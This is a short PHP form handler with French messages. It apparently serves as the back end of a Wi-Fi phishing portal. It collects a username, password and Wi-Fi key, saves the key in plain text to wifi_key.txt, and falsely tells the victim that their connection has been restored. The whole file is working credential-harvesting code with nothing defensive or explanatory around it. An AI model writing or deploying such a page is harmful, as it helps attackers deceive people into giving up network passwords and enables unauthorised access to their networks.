<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);
    $wifiKey = htmlspecialchars($_POST['wifi-key']);
    $confirmWifiKey = htmlspecialchars($_POST['confirm-wifi-key']);

    
    if ($wifiKey !== $confirmWifiKey) {
        echo "Les clés Wi-Fi ne correspondent pas. Veuillez réessayer.";
        exit;
    }

    
    $file = 'wifi_key.txt';

    
    file_put_contents($file, $wifiKey);

    
    echo "Merci ! Votre connexion a été rétablie.";
}
?>
